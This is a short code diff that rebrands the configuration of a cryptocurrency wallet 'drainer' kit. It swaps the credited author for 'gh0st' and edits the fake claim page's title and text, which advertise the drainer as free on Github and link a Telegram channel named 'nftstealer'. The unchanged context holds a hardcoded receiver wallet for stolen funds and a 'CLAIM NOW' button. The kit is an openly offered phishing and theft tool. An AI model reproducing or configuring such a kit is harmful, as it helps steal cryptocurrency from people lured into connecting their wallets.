@@ -1,4 +1,4 @@
-// Credits: @0xTracey on Github
+// Credits: gh0st on Github
 
 var receiverwallet = "0x8c5D482b9Ff36B3C360F5e9667109a4657465CAc";
 
@@ -22,8 +22,8 @@ const indexPageInfo = {
 }
 
 const claimPageInfo = {
-    title: "@0xTracey DRAINER", // <br> is a line break
-    shortDescription: "Get this Drainer for free though Github. @0xTracey",
+    title: "gh0st DRAINER", // <br> is a line break
+    shortDescription: "Get this Drainer for free though Github. gh0st",
     longDescription: "https://t.me/nftstealer",
 
     claimButtonText: "CLAIM NOW",
